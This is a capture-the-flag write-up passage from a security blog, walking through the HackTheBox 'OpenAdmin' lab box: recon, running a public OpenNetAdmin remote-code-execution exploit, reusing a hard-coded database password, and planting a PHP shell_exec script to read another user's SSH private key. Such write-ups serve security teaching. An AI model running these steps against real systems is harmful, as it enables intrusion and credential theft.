<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn’t recommend it for beginners">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - OpenAdmin">
<meta property="og:url" content="https://hg8.sh/openadmin/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn’t recommend it for beginners">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158541-eef18000-9888-11ea-92ce-95a28fbd9c8d.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/73017278-cd731100-3e1f-11ea-9b01-c07b9d816af3.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/73017609-6efa6280-3e20-11ea-9f62-3d00bd0d24a9.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/73017790-ac5ef000-3e20-11ea-9efa-0c4587673e66.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/73084568-7b88c480-3ecd-11ea-8092-c4d2e7eb43ed.png">
<meta property="article:published_time" content="2020-05-01T22:00:00.000Z">
<meta property="article:modified_time" content="2020-05-18T10:09:24.282Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="gtfobins">
<meta property="article:tag" content="php">
<meta property="article:tag" content="sudo">
<meta property="article:tag" content="john">
<meta property="article:tag" content="exploit">
<meta property="article:tag" content="openadmin">
<meta property="article:tag" content="opennetadmin">
<meta property="article:tag" content="shell_exec">
<meta property="article:tag" content="apache">
<meta property="article:tag" content="ssh">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158541-eef18000-9888-11ea-92ce-95a28fbd9c8d.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
     
    <title>HackTheBox - OpenAdmin :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/pwnable/fd/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/mango/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/openadmin/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/openadmin/&text=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/openadmin/&is_video=false&description=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - OpenAdmin&body=Check out this article: https://hg8.sh/openadmin/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/openadmin/&title=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/openadmin/&name=HackTheBox - OpenAdmin&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/openadmin/&t=HackTheBox - OpenAdmin" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-jimmy"><span class="toc-number">1.2.</span> <span class="toc-text">Pivot www-data -&gt; jimmy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-jimmy-gt-joanna"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot jimmy -&gt; joanna</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-nano-SUID"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit nano SUID</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.png);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
       
        <li><a href="/tags/">Tags</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - OpenAdmin
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-05-01T22:00:00.000Z" itemprop="datePublished">02-05-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      9 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="585" alt="openadmin-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158541-eef18000-9888-11ea-92ce-95a28fbd9c8d.png">

<p>OpenAdmin is an easy Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn’t recommend it for beginners since it require a lot a recon, it’s easy to miss important information and can be very frustrating if you are not used to it.</p>
<p><strong>Tl;Dr:</strong> To get the user flag you had to exploit a Remote Code Execution exploit on an outdated <code>opennetadmin</code> instance. You get a shell as <code>www-data</code> from which you pivot to the <code>jimmy</code> user after finding his password in a database config file. From <code>jimmy</code> account you pivot again to <code>joanna</code> account by extracting her ssh private key using a php script since the Apache web server is configured to run as user <code>joanna</code> and we have write rights over the <code>Document Root</code> folder. Finally as <code>joanna</code> we can get the user flag.<br>The root flag was a bit less tricky and needed you to execute a shell from inside a privileged <code>nano</code>  that <code>joanna</code> is allowed to run as <code>root</code> without password.</p>
<p>Alright, let’s get into it!</p>
<hr>
<p>First thing first, let’s add the box IP to the host file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.171 openadmin.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC openadmin.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> openadmin.htb (10.10.10.171)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.03 seconds</span><br></pre></td></tr></table></figure>

<p>We have the “classic”: A web app running on port 80 and the SSH port 22 open.</p>
<p>Opening <code>http://openadmin.htb/</code> display the Apache2 Ubuntu default page:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/73017278-cd731100-3e1f-11ea-9b01-c07b9d816af3.png" alt="Apache2 Ubuntu default page"></p>
<p>Nothing really interesting to see here… Let’s open  <code>gobuster</code> to see if he can find some juicy files and folders:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"http://openadmin.htb/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/artwork (Status: 301)</span><br><span class="line">/music (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/sierra (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/01/23 11:25:48 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>Three uncommon folder here: </p>
<ul>
<li><p><code>artwork</code> and <code>sierra</code> are just static demo website, nothing to do on it. </p>
</li>
<li><p><code>music</code> looks like this:</p>
</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/9076747/73017609-6efa6280-3e20-11ea-9f62-3d00bd0d24a9.png" alt="music website hackthebox"></p>
<p>Oddly enough the <code>Login</code> button redirect to an admin interface:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/73017790-ac5ef000-3e20-11ea-9efa-0c4587673e66.png" alt="open admin page"></p>
<p>First thing that catch the eye is this big yellow message:</p>
<blockquote>
<p>You are NOT on the latest release version<br>Your version    = v18.1.1<br>Latest version = Unable to determine    </p>
<p>Please DOWNLOAD the latest version.</p>
</blockquote>
<p>We all know what outdated software means right :D </p>
<p>Selecting the “DOWNLOAD” link redirect to the software page which is called…. <code>OpenNetAdmin</code>. At first I though the name of the box would be related to a admin page being open and easily accessible but turn out it was more a reference to the software used.</p>
<p>We have the name of the software and it’s version (which is outdated). Let’s see if some already made exploits are available:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit opennetadmin</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                               |  Path</span><br><span class="line">                                                             | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits/php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits/php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits/php/webapps/47691.sh</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>Bingo! Remote code execution on the exact version running here. Should be easy right?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://www.exploit-db.com/raw/47691 -o opennetadmin-rce.sh</span><br><span class="line">[hg8@archbook ~]$ bash exploit.sh http://openadmin.htb/ona/</span><br><span class="line">&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>We got a shell as <code>www-data</code>.</p>
<h3 id="Pivot-www-data-gt-jimmy"><a href="#Pivot-www-data-gt-jimmy" class="headerlink" title="Pivot www-data -&gt; jimmy"></a>Pivot www-data -&gt; jimmy</h3><p>Let’s start by enumerating users:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@openadmin:/$ ls -lh /home/</span><br><span class="line">total 8.0K</span><br><span class="line">drwxr-x--- 5 jimmy  jimmy  4.0K Jan 24 02:10 jimmy</span><br><span class="line">drwxr-x--- 6 joanna joanna 4.0K Nov 28 09:37 joanna</span><br></pre></td></tr></table></figure>

<p>Two users, we don’t have enough rights to access neither of their home folder. Let’s continue our enumerations.</p>
<p>One thing that often gives good results on web applications is searching for hard-coded password. A little grep can do that for us:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@openadmin:/$ grep -ri pass .</span><br><span class="line">[...]</span><br><span class="line">./<span class="built_in">local</span>/config/database_settings.inc.php: <span class="string">'db_passwd'</span> =&gt; <span class="string">'n1nj4W4rri0R!'</span>,</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>Here is something interesting! The full config file is the following:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ona_contexts=<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'DEFAULT'</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'databases'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt;</span><br><span class="line">      <span class="keyword">array</span> (</span><br><span class="line">        <span class="string">'db_type'</span> =&gt; <span class="string">'mysqli'</span>,</span><br><span class="line">        <span class="string">'db_host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">        <span class="string">'db_login'</span> =&gt; <span class="string">'ona_sys'</span>,</span><br><span class="line">        <span class="string">'db_passwd'</span> =&gt; <span class="string">'n1nj4W4rri0R!'</span>,</span><br><span class="line">        <span class="string">'db_database'</span> =&gt; <span class="string">'ona_default'</span>,</span><br><span class="line">        <span class="string">'db_debug'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'description'</span> =&gt; <span class="string">'Default data context'</span>,</span><br><span class="line">    <span class="string">'context_color'</span> =&gt; <span class="string">'#D3DBFF'</span>,</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>Let’s see if this password can work for either <code>jimmy</code> or <code>joanna</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh joanna@openadmin.htb</span><br><span class="line">joanna@openadmin.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">joanna@openadmin.htb'</span>s password:</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ ssh jimmy@openadmin.htb</span><br><span class="line">jimmy@openadmin.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Jan 24 01:52:49 2020 from 10.10.14.43</span></span><br><span class="line"><span class="string">jimmy@openadmin:~$ ls</span></span><br><span class="line"><span class="string">jimmy@openadmin:~$</span></span><br></pre></td></tr></table></figure>

<p>It works with <code>jimmy</code>! Unfortunately there is no user flags here, but at least we get a stable shell. </p>
<h3 id="Pivot-jimmy-gt-joanna"><a href="#Pivot-jimmy-gt-joanna" class="headerlink" title="Pivot jimmy -&gt; joanna"></a>Pivot jimmy -&gt; joanna</h3><p>Since we got database access I went to check if we could find juicy informations and potential other users password hash in the database:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:~$ mysql -u ona_sys -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| ona_default        |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; USE ona_default;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_ona_default  |</span><br><span class="line">+------------------------+</span><br><span class="line">| [...]                  |</span><br><span class="line">| users                  |</span><br><span class="line">| [...]                  |</span><br><span class="line">+------------------------+</span><br><span class="line">40 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">| id | username | password                         | level | ctime               | atime               |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-01-23 10:12:57 | 2020-01-23 10:12:57 |</span><br><span class="line">|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>Two MD5 hash. Quick Google search shows that <code>098f6bcd4621d373cade4e832627b4f6</code> is hash for <code>test</code> and <code>21232f297a57a5a743894a0e4a801fc3</code> is hash for <code>admin</code>.</p>
<p>Too bad no hash for <code>joanna</code> here. Let’s move on to more recon.</p>
<p>While looking around (still using the awesome <code>grep</code>) we find some interesting config files mentioning <code>joanna</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/etc$ grep -ri <span class="string">"joanna"</span> . 2&gt;/dev/null</span><br><span class="line">./passwd-:joanna:x:1001:1001::/home/joanna:/bin/bash</span><br><span class="line">./apache2/sites-available/internal.conf:AssignUserID joanna joanna</span><br><span class="line">./sudoers.d/joanna:joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>The <code>sudoers.d</code> one look perfect for a privilege escalation don’t you think ? Let’s keep this in mind for later. The one that really catch my eye is the apache config. Let’s see the full file:</p>
<figure class="highlight apacheconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">Listen</span></span> 127.0.0.1:52846</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 127.0.0.1:52846&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> internal.openadmin.htb</span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/internal</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;IfModule mpm_itk_module&gt;</span></span><br><span class="line"><span class="attribute">AssignUserID</span> joanna joanna</span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure>

<p>It was the first time I saw about the <code>AssignUserID</code> configuration. Even if we can easily understand that it’s meant to run the apache process for this virtualhost as <code>joanna</code> instead of <code>www-data</code> I searched on the documentation out of curiosity to learn more about this.</p>
<p>This configuration is available through the <a href="http://mpm-itk.sesse.net/" target="_blank" rel="noopener"><code>apache2-mpm-itk</code></a> module: </p>
<blockquote>
<p><code>AssignUserID</code>: Takes two parameters, uid and gid (or<br> really, user name and group name; use “#<uid>” if you want to<br> specify a raw uid); specifies what uid and gid the<br> vhost will run as (after parsing the request etc., of course).</p>
</blockquote>
<p>So, the virtualhost for <code>/var/www/internal</code> document root runs as <code>joanna</code>. If we can find a Remote Code Execution command in the PHP code in this folder (by abusing an <code>eval</code> or uploading web shell for example), then we can run commands as <code>joanna</code> user. </p>
<p>To be honest, I missed this folder in my previous recons, so let’s see what’s inside now:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/$ ls -l /<span class="keyword">var</span>/www/</span><br><span class="line">drwxr-xr-x <span class="number">6</span> www-data www-data <span class="number">4096</span> Nov <span class="number">22</span> <span class="number">15</span>:<span class="number">59</span> html</span><br><span class="line">drwxrwx--- <span class="number">2</span> jimmy    internal <span class="number">4096</span> Jan <span class="number">24</span> <span class="number">03</span>:<span class="number">11</span> internal</span><br><span class="line">jimmy@openadmin:/<span class="keyword">var</span>/www/internal$ ls -l</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal <span class="number">3228</span> Jan <span class="number">24</span> <span class="number">03</span>:<span class="number">11</span> index.php</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal  <span class="number">185</span> Nov <span class="number">23</span> <span class="number">16</span>:<span class="number">37</span> logout.php</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal  <span class="number">339</span> Nov <span class="number">23</span> <span class="number">17</span>:<span class="number">40</span> main.php</span><br></pre></td></tr></table></figure>

<p>Here is something interesting… The <code>internal</code> folder is owned by our current <code>jimmy</code>, meaning we can write anything we want in this folder. I will use use the <code>shell_exec()</code> php function to try to retrieve <code>joanna</code> ssh private key.</p>
<p>Here is one way to do it:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$output = shell_exec(<span class="string">'cat /home/joanna/.ssh/id_rsa'</span>);</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<p>Now let’s run it! (Remember apache listen on port <code>52846</code> for this virutalhost as we can see in the <code>internal.conf</code> config file)</p>
